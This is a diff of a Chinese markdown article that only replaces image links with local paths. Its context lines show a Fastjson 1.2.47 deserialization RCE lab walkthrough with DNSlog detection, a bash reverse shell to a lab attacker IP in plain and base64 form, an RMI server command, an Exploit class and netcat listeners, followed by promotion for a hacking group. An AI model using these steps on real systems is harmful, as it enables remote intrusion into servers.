@@ -95,18 +95,18 @@ json 学习链接：https://www.runoob.com/json/json-tutorial.html
 
 Fastjson 的作用是用于对 JSON 格式的数据进行解析和打包，所以出现 json 格式的地方就有可能使用了 Fastjson。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Tb6OwBlojEibam9zECN5wRXanZKVUIibcJGMHcC5wKRHncQjmpVntoI91bibgxflroGDV1J7d1kFAqdibKZTiacicEOg/640?wx_fmt=png)
+![](../../.resource/remote/f1116c7dc45abf986ae09796137a16f8071d7dd48ed38dad95afb5dee9bfae11.png)
 
 2、第二种识别方法 - 报错处理
 ----------------
 
 1、我们抓到包以后，首先将包改为 POST。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Tb6OwBlojEibam9zECN5wRXanZKVUIibcJwZ4VCkTk1icyCkqAcdh8ordoLuomUYKmnsnzTdAncOxr5gSesm4jIibQ/640?wx_fmt=png)
+![](../../.resource/remote/6fb862a3c832954b1d812d6e5635d6ca83438933410af31c9accf5558046c3f3.png)
 
 2、这时候，我们需要改两处字段。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Tb6OwBlojEibam9zECN5wRXanZKVUIibcJia4Nw2ku9HTf9eHSQH0s2pyEicHdAx3s36WoaKSUHEmTUHQSwdicOiahuQ/640?wx_fmt=png)
+![](../../.resource/remote/362db09d7d3cbfc363c0725e645d4b4b7b54a4f12e91496bee217cef7dc742f9.png)
 
 *   `Content-Type: application/xxxx`原本的字段改为`Content-Type: application/json`
     
@@ -128,7 +128,7 @@ Fastjson 的作用是用于对 JSON 格式的数据进行解析和打包，所�
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Tb6OwBlojEibam9zECN5wRXanZKVUIibcJb2hOlTziaJ3qKXO8zflOPcmnnThiasbbY7XkQ9Ilbaj3Q8rflORHPt3Q/640?wx_fmt=png)
+![](../../.resource/remote/0cea6b70192f09ac5e1283dd3745c6c06a6c98cbb8ef42ecac3bfd3dca766fbd.png)
 
 报错之后，很明显响应包里面出现了 alibaba.fastjson 的错误信息。
 
@@ -139,7 +139,7 @@ Fastjson 的作用是用于对 JSON 格式的数据进行解析和打包，所�
 
 2、获取 dnslog 地址：http://dnslog.cn/
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Tb6OwBlojEibam9zECN5wRXanZKVUIibcJqnXFBLSoz8S28dTTO6WpckdF25CE700xicjO6H5NzTHicNzXic7fXoChw/640?wx_fmt=png)
+![](../../.resource/remote/664241b3cc7e9c70ce6df7fbd2b214274a547eb5dc8402cc9ef5e35ead4739dc.png)
 
 3、将地址复制到 json 包相应的位置。
 
@@ -153,13 +153,13 @@ Fastjson 的作用是用于对 JSON 格式的数据进行解析和打包，所�
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Tb6OwBlojEibam9zECN5wRXanZKVUIibcJV8j7Oe8WlWtiboHujbfuupomhBEBDqKlqT1fhFIP8jicKtpxibYRcTceQ/640?wx_fmt=png)
+![](../../.resource/remote/9e372cc5f1865eed99a2d8d48098028a21f6dab602656d7d1a6f263de5c4c99c.png)
 
 进行发包。
 
 4、DNSlog 顺利回显。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Tb6OwBlojEibam9zECN5wRXanZKVUIibcJAjzibA2kBLNCon7tLhtbwI83qhOQlbuPmtd7CL5tTmzxFicB1Wzgmdog/640?wx_fmt=png)
+![](../../.resource/remote/f67a713a179313cdbc0fd6a0c00392f74600ea9c32a41f60e5148d197c91d6ea.png)
 
 五、Fastjson1.2.47 命令执行漏洞复现
 =========================
@@ -196,11 +196,11 @@ docker-compose config
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Tb6OwBlojEibam9zECN5wRXanZKVUIibcJcRwsuloFT4K0libZsBBz95EwhM6FxqnzZa0iaB1RsMowUOyepVNWTyYA/640?wx_fmt=png)
+![](../../.resource/remote/52b20011d7eb7665eae85660ab82601c7fb9ca93c3dc57b7435a2baa9b1ffc55.png)
 
 2、接着我们访问漏洞页面：http://192.168.111.133:8090/
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Tb6OwBlojEibam9zECN5wRXanZKVUIibcJZXQeWw3YRWTzic8QLYvGgaISm7fYQkiaKWsXOucj6xcxFrghAGn17OUQ/640?wx_fmt=png)
+![](../../.resource/remote/6569c126e586f9c336f0dc285d9871d9501dc24ca9ec90ab931905f4ce0c24b7.png)
 
 环境启动成功。
 
@@ -234,7 +234,7 @@ bash -i >& /dev/tcp/192.168.111.129/6666 0>&1
 
 我们进行 base64 编码：http://www.jsons.cn/base64/
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Tb6OwBlojEibam9zECN5wRXanZKVUIibcJ9OTM9JohZTWibWvYpxCGuF3SVysfPwYw4zx6639Jhdcf2Pnt5AGStuw/640?wx_fmt=png)
+![](../../.resource/remote/eeb0bde522739a3081db5f40dfc9c746a4b0392df706331e2d733fefee6d4365.png)
 
 ```
 bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMS4xMjkvNjY2NiAwPiYx}|{base64,-d}|{bash,-i}
@@ -248,7 +248,7 @@ java -cp fastjson_tool.jar fastjson.HRMIServer 192.168.111.129 9999 "bash -c {ec
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Tb6OwBlojEibam9zECN5wRXanZKVUIibcJQSSa8QQY1lSVU3hvhIxkI75nYUBpXEEcXvxCU4xHg4MQ1hCmclfJPA/640?wx_fmt=png)
+![](../../.resource/remote/455eadbce3bfca3206c61720183e1bb5c865ccd5a0b285dfecb829b9280ca561.png)
 
 利用 JNDI 注入加载远程 RMI server 上的字节码。
 
@@ -279,13 +279,13 @@ public class Exploit {
 
 javac Exploit.java
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Tb6OwBlojEibam9zECN5wRXanZKVUIibcJE2wnUNUork0XpvDopV04xA9XvLQvxPssDKTRve3mxL4Uic3eC0npjJA/640?wx_fmt=png)
+![](../../.resource/remote/420bea61677a59349c0b098082bcabd25ecacb651f602ce0436fe725d8a93279.png)
 
 8、我们在攻击机开启监听。
 
 nc -lvvp 6666
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Tb6OwBlojEibam9zECN5wRXanZKVUIibcJqClDlTxmjCCrnM3WiblYjLcbGOCXuIuJc2hEvMysIsWqhJjOnWZ1QEQ/640?wx_fmt=png)
+![](../../.resource/remote/54648694ae51c079bda67e9baa7526360aeb43dd564067ddb97b48d8bf418779.png)
 
 9、我们在 Burp 中复制 payload，进行发包。
 
@@ -304,11 +304,11 @@ nc -lvvp 6666
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Tb6OwBlojEibam9zECN5wRXanZKVUIibcJx8eibFVUFMUia3C1goT30NhdcW7dowwLdysB7okAMtQlkyBv8GZmtKHQ/640?wx_fmt=png)
+![](../../.resource/remote/4c810e0fe2bceb11e6e339f59288a3528bc385d4625698fea37aa36c084671ae.png)
 
 10、成功得到 shell。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Tb6OwBlojEibam9zECN5wRXanZKVUIibcJCLa7nfmybYrP0B3JDMDhKc2Ds6QfOqFZtzsiaPiatfLib6ZzroNibw50kA/640?wx_fmt=png)
+![](../../.resource/remote/bedb02541f0ed1ca661541d3244eecd02e69122347bc86a31dceff6b872df1be.png)
 
 注意，重新获得 shell 的话，需要删除. class 文件，重新生成。
 
@@ -349,7 +349,7 @@ public class Exploit{
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Tb6OwBlojEibam9zECN5wRXanZKVUIibcJv2EiaezkKzP6eYBR2Gd5CXwD2YVXEpticS9UI5ibGJiaZTlYkX2LFX6LDg/640?wx_fmt=png)
+![](../../.resource/remote/c7238493aff1cd62b0b287a4de610c113bd7bc60e58fddf6699cb00845e0c42e.png)
 
 4、在攻击机开启 8000 端口的 HTTP 服务，在 Exploit.class 所在目录执行。
 
@@ -363,7 +363,7 @@ public class Exploit{
 
 nc -lvvp 2333
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Tb6OwBlojEibam9zECN5wRXanZKVUIibcJia2gozOzdL1kCYUlzsEypmuDzJECVhgq0VQFuqHYzRms0IeNC8Lcv4w/640?wx_fmt=png)
+![](../../.resource/remote/91c78866ec408a2dba99b78bc0d23afb4874324853b1f0559a939ce6ffd78b17.png)
 
 6、Burp 攻击靶机。
 
@@ -382,11 +382,11 @@ nc -lvvp 2333
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Tb6OwBlojEibam9zECN5wRXanZKVUIibcJIQCWajmYXhOOsVqTll85n6l3178bEiav37zTD8DJ4Yak4X9CUMPHlyw/640?wx_fmt=png)
+![](../../.resource/remote/5612170b8d0abd8589fba5da4d287c77ea4de0ea9a03934445c28b21a2d44f81.png)
 
 7、得到 shell。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Tb6OwBlojEibam9zECN5wRXanZKVUIibcJ8mIgUa90UYbUuGm0PJVnXS1zkicX7ciauRBxibkrdfAffic8aGXib7jqFVA/640?wx_fmt=png)
+![](../../.resource/remote/4e3741b6a7032599a0b618c22af6be7019f45ad929afba4d23fa80c8f2e15dc8.png)
 
 六、Fastjson 历史漏洞
 ===============
@@ -449,41 +449,41 @@ nc -lvvp 2333
 
 **代码审计 + 免杀 + 渗透学习资源 + 各种资料文档 + 各种工具 + 付费会员**
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif&random=0.4447566002908574)
+![](../../.resource/remote/2283725dd954602e2683caaaf09cf31e1b5878cfb352086e4738684c3f29897a.gif)
 
   
 
 ****进成员内部群****
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/pPVXCo8Wd8AQHAyOTgM5sLrvP6qiboXljGWG0uOdvcNR8Qw5QJLxSVrbFds2j7MxExOz1ozb9ZoYwR68leoLdAg/640?wx_fmt=jpeg)
+![](../../.resource/remote/be2ed8331c8a8e32cf6f94eb8eec4347c1a7766c1a216de986393decb700949d.jpg)
 
   
 
   
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif&random=0.09738205945672873)
+![](../../.resource/remote/2283725dd954602e2683caaaf09cf31e1b5878cfb352086e4738684c3f29897a.gif)
 
   
 
 ****星球的最近主题和星球内部工具一些展示****
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/pPVXCo8Wd8BSTqCH7icxibMMbYMbD0crC5dYebNa2xgTzZXnNibz0cO6PnhBECH2IyNSoEqqhLkCC8VZrWFPf6tmQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/048311efc7c3f5066cad0735b139380349070777da99616c545a11e9c651af29.jpg)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8BmE6FAA8Bq7H9GZIRt1xYZpmYNWxrrzolt71FtX5HyM03H0cxkiaYelv7ZSajLtibEdBXUpCibdItXw/640?wx_fmt=png)
+![](../../.resource/remote/4ad00afd34a98232ef71fbc56b2cd0449059273ab90090a6d5a71cd24b4f6431.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8ADSxxicsBmvhX9yBIPibyJTWnDpqropKaIKtZQE3B9ZpgttJuibibCht1jXkNY7tUhLxJRdU6gibnrn0w/640?wx_fmt=png)
+![](../../.resource/remote/95543657e829477600aefe472073fafc65087bca566bd057e8e5924c13db0c58.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8BmE6FAA8Bq7H9GZIRt1xYZgsg36Ux714McsSCWkKC5xbT9z6I5ypjTwImwicCmygt1CFBdGGdAHmQ/640?wx_fmt=png)
+![](../../.resource/remote/86b5152d70f5536e02d261583590839470299368dd7e038410a253fb451272ec.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8D0bS8ibc3XhFcDYkVusFvc3c6onthQpPGZn4v32rpOp7CeFiamGdeC7JBk0mGVsiciazLp3z0SIJAtnQ/640?wx_fmt=png)
+![](../../.resource/remote/7a090c597f4d6f43e761ca60d030335198fedfb5ac6732a2012abf133f31093a.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8B96heXWOIseicx7lYZcN8KRN8xTiaOibRiaHVP4weL4mxd0gyaWSuTIVJhBRdBmWXjibmcfes6qR1w49w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)
+![](../../.resource/remote/19ed9fa93f2b291fabed8b6ebd450ff76daf3295795bae99985a06f859672c41.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8BmE6FAA8Bq7H9GZIRt1xYZs2aG5XNnBg7GlMicVeUa0You2kXIiaEqrzZbSjjgt6rlZy7CNn4MthlQ/640?wx_fmt=png)
+![](../../.resource/remote/409293bfbde23a54f46909b8ffa617615c00ef1e01d70782d19255700984f2d9.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8BSTqCH7icxibMMbYMbD0crC5LT6B0MshKneP4sjRTxGuc7wCxN032YahcQg4LEicwPNJc0gZFZMHTnw/640?wx_fmt=png)
+![](../../.resource/remote/bf37db915d0d89cff537aba1409194ae11d9dc592a6d4cf59a6ebcf6acedf059.png)
 
-**![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8CzYcn7C4DHT0vibm3SyRASB2Rz5WYRNLKHragHRliaADVFCc97licvVdY0lfRDeIK9MibelOPMiapTT3w/640?wx_fmt=png)**
+**![](../../.resource/remote/e1985a2642c623c87d6e99ec020b350a06207892a1d238a211119ddfd45eb150.png)**
 
 **关 注 有 礼**
 
@@ -493,9 +493,9 @@ nc -lvvp 2333
 
 关注下方公众号回复 “666” 可以领取一套领取黑客成长秘籍
 
-![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1) 还在等什么？赶紧点击下方名片关注学习吧！![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)
+![](../../.resource/remote/308b930b5d78a66f7a0c9ebe56905812674f1f404cfa60e9c0e3c37367629f73.png) 还在等什么？赶紧点击下方名片关注学习吧！![](../../.resource/remote/308b930b5d78a66f7a0c9ebe56905812674f1f404cfa60e9c0e3c37367629f73.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)  
+![](../../.resource/remote/40aaad22af7f44171fc001f77fa3df3da580afe10e64b4cc679d75fa1c5f4216.png)  
 
 **推荐阅读**
 
